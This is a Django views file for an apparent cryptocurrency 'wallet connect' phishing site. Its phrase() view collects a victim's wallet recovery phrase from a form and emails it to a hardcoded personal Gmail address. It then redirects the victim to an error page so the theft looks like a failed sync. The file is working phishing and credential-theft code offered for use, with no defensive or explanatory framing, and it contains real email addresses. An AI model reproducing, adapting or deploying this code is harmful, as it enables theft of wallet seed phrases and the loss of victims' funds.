from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings


# Create your views here.
receiver = "jamiedurnmont@gmail.com"
#test = ["smiletruck345@gmail.com", ]


def index(request):
    return render(request, "wallet/index.html")


def index2(request):
    return render(request, "wallet/error1.html")


def sync(request):
    return render(request, 'wallet/connect.html')

def phrase(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        phrase1 = request.POST.get("phrase")
        subject = 'Phrase'
        message = f'Phrase : {phrase1}'
        email_from = 'wallet Connect'
        recipient_list = [receiver, ]

        send_mail(subject, message, email_from, recipient_list)
        #send_mail(subject, message, email_from, test)
        return redirect('wallet/error1.html')

    return render(request, 'wallet/connect.html')
